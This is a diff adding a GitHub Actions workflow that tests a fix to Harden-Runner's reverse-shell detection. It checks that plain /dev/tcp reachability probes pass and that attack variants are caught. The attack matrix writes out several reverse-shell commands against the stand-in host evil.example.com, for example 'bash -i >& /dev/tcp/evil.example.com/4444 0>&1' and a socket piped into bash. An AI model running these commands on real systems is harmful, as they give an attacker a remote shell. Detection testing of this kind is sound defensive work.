@@ -1,0 +1,108 @@
+# Verifies the reverse-shell false-positive fix for stdin-only /dev/tcp
+# reachability probes (agent-api branch fix/reverse-shell-devtcp-probe).
+#
+# Customer case (Synthesia, syren-studio): before every bazel build a composite
+# action runs
+#   timeout 5 bash -c '</dev/tcp/bazel-remote.bazel-cache.svc.cluster.local/9092'
+# to check the remote cache is reachable. Harden-Runner flagged it as a
+# Reverse-Shell and, with the lockdown response on, killed the runner ~10 ms
+# after the probe.
+#
+# Enable the reverse-shell lockdown response for this repo/workflow on int
+# before dispatching.
+#
+#   probe-*   -> expected after the fix: no Reverse-Shell detection, job passes
+#   attack-*  -> expected before and after the fix: Reverse-Shell detected and,
+#                with lockdown on, the job is killed
+#
+# Before the fix is deployed to int, every job is expected to be flagged/killed.
+name: reverse-shell-devtcp-probe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    name: probe-${{ matrix.case }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # Exact customer command. The host does not resolve on a hosted
+          # runner, but bash is still exec'd with the same arguments, which is
+          # all the detection looks at.
+          - case: customer-cluster-local
+            script: "</dev/tcp/bazel-remote.bazel-cache.svc.cluster.local/9092"
+          # Same shape against a reachable, allowed endpoint, so the TCP
+          # connect actually succeeds.
+          - case: reachable-remote
+            script: "</dev/tcp/github.com/443"
+          - case: noop-builtin
+            script: ": </dev/tcp/github.com/443"
+          - case: true-builtin-fd0
+            script: "true 0< /dev/tcp/github.com/443"
+    steps:
+      - name: Harden Runner
+        uses: step-security/harden-runner@rc-20-int
+        with:
+          egress-policy: block
+          allowed-endpoints: >
+            github.com:443
+            api.github.com:443
+
+      - name: Reachability probe
+        env:
+          SCRIPT: ${{ matrix.script }}
+        run: |
+          if timeout 5 bash -c "$SCRIPT"; then
+            echo "reachable"
+          else
+            echo "unreachable"
+          fi
+
+      - name: Runner survived the probe
+        run: sleep 20 && echo "runner still alive after probe"
+
+  attack:
+    name: attack-${{ matrix.case }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - case: classic
+            script: "bash -i >& /dev/tcp/evil.example.com/4444 0>&1"
+          - case: interactive-probe
+            flags: "-i"
+            script: "</dev/tcp/evil.example.com/4444"
+          - case: exec-stdin
+            script: "exec </dev/tcp/evil.example.com/4444"
+          - case: stdin-piped-to-shell
+            script: "cat </dev/tcp/evil.example.com/4444 | bash"
+          - case: stdout-to-socket
+            script: "echo hi >/dev/tcp/evil.example.com/4444"
+          - case: probe-then-command
+            script: "</dev/tcp/evil.example.com/4444 && sh"
+    steps:
+      - name: Harden Runner
+        uses: step-security/harden-runner@rc-20-int
+        with:
+          egress-policy: block
+          allowed-endpoints: >
+            github.com:443
+            api.github.com:443
+
+      # evil.example.com does not resolve and egress is blocked, so nothing
+      # connects; the bash process event alone should trigger the detection.
+      - name: Reverse shell pattern
+        env:
+          FLAGS: ${{ matrix.flags }}
+          SCRIPT: ${{ matrix.script }}
+        run: timeout 5 bash $FLAGS -c "$SCRIPT" </dev/null || true
+
+      - name: Runner survived (should NOT be reached with lockdown on)
+        run: sleep 20 && echo "runner still alive"
